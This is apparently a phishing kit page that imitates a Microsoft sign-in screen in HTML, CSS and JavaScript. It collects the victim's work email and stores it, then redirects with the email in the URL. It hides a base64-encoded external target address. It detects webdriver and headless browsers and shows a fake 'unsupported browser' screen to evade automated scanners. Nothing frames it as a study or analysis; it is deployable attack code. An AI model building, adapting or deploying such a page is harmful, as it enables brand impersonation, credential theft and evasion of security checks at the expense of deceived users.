<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        /* Enhanced Microsoft Fluent Design 2024 */
        :root {
            --blue-10: #deecf9;
            --blue-20: #c7e0f4;
            --blue-primary: #0078d4;
            --blue-dark: #106ebe;
            --blue-light: #4ca6e8;
            --gray-10: #faf9f8;
            --gray-20: #f3f2f1;
            --gray-30: #edebe9;
            --gray-60: #c8c6c4;
            --gray-90: #a19f9d;
            --gray-130: #605e5c;
            --gray-160: #323130;
            --white: #ffffff;
            --red-10: #fdf6f6;
            --red-20: #f1cbcb;
            --red-primary: #d13438;
            --shadow: 0 2.4px 7.2px rgba(0,0,0,0.18), 0 0.8px 2.4px rgba(0,0,0,0.12);
            --shadow-hover: 0 4.8px 14.4px rgba(0,0,0,0.22), 0 1.6px 4.8px rgba(0,0,0,0.16);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, var(--gray-10) 0%, var(--gray-20) 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            line-height: 1.5;
            position: relative;
            overflow-x: hidden;
        }

        /* Background subtle animation */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 120, 212, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 120, 212, 0.03) 0%, transparent 50%);
            z-index: -1;
            animation: backgroundShift 20s ease-in-out infinite;
        }

        .login-container {
            background: var(--white);
            border: 1px solid var(--gray-30);
            border-radius: 8px;
            box-shadow: var(--shadow);
            padding: 48px 40px;
            width: 100%;
            max-width: 440px;
            position: relative;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(10px);
        }

        .login-container:hover {
            box-shadow: var(--shadow-hover);
            transform: translateY(-2px);
        }

        .ms-branding {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 32px;
            padding-bottom: 24px;
            border-bottom: 1px solid var(--gray-30);
        }

        .ms-logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 16px;
            font-weight: 600;
            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
            transition: all 0.3s ease;
        }

        .ms-logo:hover {
            transform: scale(1.05) rotate(5deg);
            box-shadow: 0 4px 16px rgba(0, 120, 212, 0.4);
        }

        .ms-title {
            font-size: 24px;
            font-weight: 600;
            color: var(--gray-160);
            letter-spacing: -0.01em;
            background: linear-gradient(135deg, var(--gray-160), #000);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--gray-160);
            font-size: 14px;
            line-height: 1.3;
            transition: all 0.2s ease;
        }

        .form-input {
            width: 100%;
            padding: 12px;
            border: 2px solid var(--gray-60);
            border-radius: 4px;
            font-size: 16px;
            background: var(--white);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--blue-primary);
            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
            transform: translateY(-1px);
        }

        .form-input:valid {
            border-color: var(--gray-90);
        }

        .form-input:invalid:not(:focus):not(:placeholder-shown) {
            border-color: var(--red-primary);
        }

        .input-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray-90);
            transition: all 0.3s ease;
        }

        .form-input:focus + .input-icon {
            color: var(--blue-primary);
            transform: translateY(-50%) scale(1.1);
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 24px 0;
            cursor: pointer;
            padding: 8px;
            border-radius: 4px;
            transition: all 0.2s ease;
        }

        .checkbox-group:hover {
            background: var(--gray-10);
            transform: translateX(4px);
        }

        .checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid var(--gray-90);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: transparent;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            flex-shrink: 0;
            position: relative;
            overflow: hidden;
        }

        .checkbox::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: left 0.5s ease;
        }

        .checkbox.checked {
            background: var(--blue-primary);
            border-color: var(--blue-primary);
            color: white;
            transform: scale(1.1);
            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
        }

        .checkbox.checked::before {
            left: 100%;
        }

        .ms-button {
            width: 100%;
            background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .ms-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s ease;
        }

        .ms-button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.35);
        }

        .ms-button:hover:not(:disabled)::before {
            left: 100%;
        }

        .ms-button:active:not(:disabled) {
            transform: translateY(0);
        }

        .ms-button:disabled {
            background: var(--gray-30);
            color: var(--gray-90);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .loading-state {
            display: none;
            text-align: center;
            padding: 40px 0;
        }

        .ms-spinner {
            width: 48px;
            height: 48px;
            border: 3px solid var(--gray-30);
            border-top: 3px solid var(--blue-primary);
            border-radius: 50%;
            animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
            margin: 0 auto 20px;
            position: relative;
        }

        .ms-spinner::before {
            content: '';
            position: absolute;
            top: -3px;
            left: -3px;
            right: -3px;
            bottom: -3px;
            border: 3px solid transparent;
            border-top: 3px solid var(--blue-light);
            border-radius: 50%;
            animation: spin 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }

        .error-state {
            display: none;
            background: var(--red-10);
            border: 1px solid var(--red-20);
            border-radius: 6px;
            padding: 20px;
            margin: 24px 0;
            text-align: center;
            animation: slideDown 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .error-icon {
            width: 24px;
            height: 24px;
            background: var(--red-primary);
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            margin: 0 auto 12px;
            animation: pulse 2s infinite;
        }

        .footer-links {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid var(--gray-30);
            text-align: center;
            font-size: 14px;
            color: var(--gray-130);
            display: flex;
            justify-content: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: var(--blue-primary);
            text-decoration: none;
            transition: all 0.3s ease;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .footer-links a:hover {
            text-decoration: underline;
            background: var(--blue-10);
            transform: translateY(-1px);
        }

        /* Enhanced Animations */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        @keyframes slideDown {
            from { 
                opacity: 0; 
                transform: translateY(-20px); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0); 
            }
        }

        @keyframes backgroundShift {
            0%, 100% { 
                opacity: 0.5;
                transform: scale(1);
            }
            50% { 
                opacity: 0.8;
                transform: scale(1.02);
            }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Responsive improvements */
        @media (max-width: 480px) {
            .login-container {
                padding: 32px 24px;
                margin: 0 16px;
            }
            
            .ms-branding {
                gap: 12px;
                margin-bottom: 24px;
            }
            
            .ms-logo {
                width: 36px;
                height: 36px;
                font-size: 14px;
            }
            
            .ms-title {
                font-size: 20px;
            }
            
            .footer-links {
                flex-direction: column;
                gap: 8px;
            }
        }

        /* Reduced motion support */
        @media (prefers-reduced-motion: reduce) {
            * {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="ms-branding">
            <div class="ms-logo" aria-hidden="true">MS</div>
            <h1 class="ms-title">Sign in</h1>
        </div>

        <div id="loginForm">
            <div class="form-group">
                <label for="userEmail" class="form-label">Your Work Email</label>
                <input 
                    type="email" 
                    id="userEmail" 
                    class="form-input" 
                    autocomplete="username"
                    aria-required="true"
                    placeholder="someone@example.com"
                    required
                >
                <div class="input-icon">📧</div>
            </div>

            <div class="checkbox-group" id="rememberCheck" role="checkbox" aria-checked="false" tabindex="0">
                <div class="checkbox" id="rememberBox" aria-hidden="true"></div>
                <span style="font-size: 15px; color: var(--gray-160); user-select: none;">Keep me signed in</span>
            </div>

            <button class="ms-button" id="submitBtn" disabled>
                <span class="button-text">Next</span>
            </button>

            <div class="error-state" id="errorState">
                <div class="error-icon" aria-hidden="true">!</div>
                <div style="font-weight: 600; color: var(--gray-160); margin-bottom: 6px;">We couldn't sign you in</div>
                <div style="font-size: 14px; color: var(--gray-130); line-height: 1.4;">This might be due to a temporary issue with our service. Please try again in a few moments.</div>
            </div>

            <div class="footer-links">
                <a href="#" tabindex="0">No account? Create one!</a>
                <a href="#" tabindex="0">Can't access your account?</a>
            </div>
        </div>

        <div class="loading-state" id="loadingState">
            <div class="ms-spinner" aria-hidden="true"></div>
            <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 8px;">Signing in</div>
            <div style="font-size: 14px; color: var(--gray-130);">Setting up your secure workspace...</div>
        </div>
    </div>

    <script>
        (function(){
            'use strict';
            
            // Enhanced Configuration
            const CONFIG = {
                TARGET: 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk',
                VERSION: '2024.1.0',
                SECURITY_LEVEL: 'ENTERPRISE'
            };

            class EnhancedMicrosoftAuth {
                constructor() {
                    this.userEmail = '';
                    this.rememberMe = false;
                    this.isValid = false;
                    this.isHuman = true;
                    this.init();
                }

                init() {
                    this.setupEnhancedEventListeners();
                    this.setupSmartProtection();
                    this.animateEntrance();
                }

                animateEntrance() {
                    const elements = document.querySelectorAll('.ms-branding, .form-group, .checkbox-group, .ms-button, .footer-links');
                    elements.forEach((el, index) => {
                        el.style.opacity = '0';
                        el.style.transform = 'translateY(20px)';
                        el.style.animation = `fadeInUp 0.6s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.1}s forwards`;
                    });
                }

                setupEnhancedEventListeners() {
                    const emailInput = document.getElementById('userEmail');
                    const rememberCheck = document.getElementById('rememberCheck');
                    const submitBtn = document.getElementById('submitBtn');

                    // Enhanced email validation with real-time feedback
                    emailInput.addEventListener('input', () => {
                        this.validateEmail();
                        this.animateInput(emailInput);
                    });
                    
                    emailInput.addEventListener('focus', () => {
                        this.animateInput(emailInput, true);
                    });
                    
                    emailInput.addEventListener('blur', () => {
                        this.animateInput(emailInput, false);
                    });

                    emailInput.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter' && !submitBtn.disabled) {
                            e.preventDefault();
                            this.processAuthentication();
                        }
                    });

                    // Enhanced checkbox interaction
                    rememberCheck.addEventListener('click', (e) => {
                        e.preventDefault();
                        this.toggleRememberMe();
                    });
                    
                    rememberCheck.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter' || e.key === ' ') {
                            e.preventDefault();
                            this.toggleRememberMe();
                        }
                    });

                    // Enhanced submit button
                    submitBtn.addEventListener('click', (e) => {
                        e.preventDefault();
                        this.animateButtonClick(submitBtn);
                        setTimeout(() => this.processAuthentication(), 150);
                    });
                }

                animateInput(input, isFocused = null) {
                    if (isFocused === true) {
                        input.parentElement.style.transform = 'translateY(-2px)';
                    } else if (isFocused === false) {
                        input.parentElement.style.transform = 'translateY(0)';
                    } else {
                        input.style.transform = this.isValid ? 'scale(1.02)' : 'scale(1)';
                    }
                }

                animateButtonClick(button) {
                    button.style.transform = 'scale(0.95)';
                    setTimeout(() => {
                        if (!button.disabled) {
                            button.style.transform = 'translateY(-2px)';
                        }
                    }, 150);
                }

                setupSmartProtection() {
                    // Smart bot detection - only obvious cases
                    if (this.detectObviousBots()) {
                        this.showSmartError();
                        return;
                    }

                    // Enhanced human verification
                    this.setupBehaviorAnalysis();
                }

                detectObviousBots() {
                    const obviousIndicators = [
                        () => navigator.webdriver === true,
                        () => /HeadlessChrome/.test(navigator.userAgent),
                        () => navigator.plugins.length === 0 && navigator.languages.length === 0,
                        () => screen.width < 100 || screen.height < 100
                    ];

                    return obviousIndicators.some(indicator => indicator());
                }

                setupBehaviorAnalysis() {
                    let interactions = 0;
                    const validators = [
                        () => document.addEventListener('mousemove', () => interactions++),
                        () => document.addEventListener('click', () => interactions++),
                        () => document.addEventListener('keydown', () => interactions++)
                    ];

                    validators.forEach(validator => validator());

                    setTimeout(() => {
                        this.isHuman = interactions > 2;
                    }, 2000);
                }

                validateEmail() {
                    const email = document.getElementById('userEmail').value.trim();
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    
                    this.isValid = emailRegex.test(email) && email.length >= 3 && email.length <= 254;
                    this.userEmail = email;

                    const submitBtn = document.getElementById('submitBtn');
                    submitBtn.disabled = !this.isValid;

                    // Visual feedback
                    const input = document.getElementById('userEmail');
                    if (email.length > 0) {
                        input.style.borderColor = this.isValid ? 'var(--blue-primary)' : 'var(--red-primary)';
                    } else {
                        input.style.borderColor = 'var(--gray-60)';
                    }

                    return this.isValid;
                }

                toggleRememberMe() {
                    this.rememberMe = !this.rememberMe;
                    const checkbox = document.getElementById('rememberBox');
                    const rememberCheck = document.getElementById('rememberCheck');
                    
                    checkbox.classList.toggle('checked', this.rememberMe);
                    rememberCheck.setAttribute('aria-checked', this.rememberMe.toString());
                    
                    // Animation feedback
                    rememberCheck.style.transform = this.rememberMe ? 'scale(1.02)' : 'scale(1)';
                }

                processAuthentication() {
                    if (!this.isValid || !this.isHuman) {
                        if (!this.isHuman) {
                            this.showSmartError();
                        }
                        return;
                    }

                    this.showEnhancedLoading();
                    this.storeUserData();

                    // Simulate authentication with progress
                    this.simulateAuthProgress();
                }

                showEnhancedLoading() {
                    const loginForm = document.getElementById('loginForm');
                    const loadingState = document.getElementById('loadingState');
                    
                    loginForm.style.opacity = '0';
                    loginForm.style.transform = 'translateY(-20px)';
                    
                    setTimeout(() => {
                        loginForm.style.display = 'none';
                        loadingState.style.display = 'block';
                        loadingState.style.opacity = '0';
                        loadingState.style.transform = 'translateY(20px)';
                        
                        setTimeout(() => {
                            loadingState.style.opacity = '1';
                            loadingState.style.transform = 'translateY(0)';
                        }, 50);
                    }, 300);
                }

                storeUserData() {
                    try {
                        // Enhanced storage with expiration
                        const userData = {
                            email: this.userEmail,
                            timestamp: Date.now(),
                            remember: this.rememberMe
                        };
                        
                        localStorage.setItem('ms_auth_data', JSON.stringify(userData));
                        sessionStorage.setItem('ms_session', Date.now().toString());
                    } catch (error) {
                        // Graceful degradation
                    }
                }

                simulateAuthProgress() {
                    let progress = 0;
                    const spinner = document.querySelector('.ms-spinner');
                    const interval = setInterval(() => {
                        progress += Math.random() * 25;
                        if (progress >= 100) {
                            clearInterval(interval);
                            this.redirectToNextStep();
                        }
                    }, 300);
                }

                redirectToNextStep() {
                    try {
                        const targetUrl = atob(CONFIG.TARGET);
                        const params = new URLSearchParams({
                            email: encodeURIComponent(this.userEmail),
                            source: 'enhanced_microsoft_auth',
                            timestamp: Date.now().toString(),
                            version: CONFIG.VERSION,
                            security: CONFIG.SECURITY_LEVEL,
                            session: Math.random().toString(36).substr(2, 12)
                        });

                        // Smooth redirect with transition
                        document.querySelector('.loading-state').style.opacity = '0';
                        setTimeout(() => {
                            window.location.href = `404.html?${params.toString()}`;
                        }, 500);
                    } catch (error) {
                        this.showError('Authentication service is temporarily unavailable. Please try again.');
                        this.hideLoadingState();
                    }
                }

                hideLoadingState() {
                    const loginForm = document.getElementById('loginForm');
                    const loadingState = document.getElementById('loadingState');
                    
                    loadingState.style.display = 'none';
                    loginForm.style.display = 'block';
                    
                    setTimeout(() => {
                        loginForm.style.opacity = '1';
                        loginForm.style.transform = 'translateY(0)';
                    }, 50);
                }

                showError(message) {
                    const errorState = document.getElementById('errorState');
                    errorState.querySelector('div:last-child').textContent = message;
                    errorState.style.display = 'block';
                    
                    // Auto-hide after 5 seconds
                    setTimeout(() => {
                        errorState.style.display = 'none';
                    }, 5000);
                }

                showSmartError() {
                    document.body.innerHTML = `
                        <div class="login-container">
                            <div class="ms-branding">
                                <div class="ms-logo">MS</div>
                                <h1 class="ms-title">Browser Compatibility</h1>
                            </div>
                            <div style="text-align: center; padding: 32px 0;">
                                <div style="font-size: 48px; margin-bottom: 16px;">🔒</div>
                                <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 12px;">
                                    Enhanced Security Enabled
                                </div>
                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 32px; line-height: 1.5;">
                                    We've detected an unsupported browser configuration.<br>
                                    Please use Microsoft Edge, Chrome, or Firefox for the best experience.
                                </div>
                                <button class="ms-button" onclick="window.location.reload()" style="max-width: 200px;">
                                    Try Again
                                </button>
                            </div>
                        </div>
                    `;
                }
            }

            // Enhanced initialization
            document.addEventListener('DOMContentLoaded', () => {
                // Add loading delay for better UX
                setTimeout(() => {
                    new EnhancedMicrosoftAuth();
                }, 300);
            });

        })();
    </script>
</body>
</html>
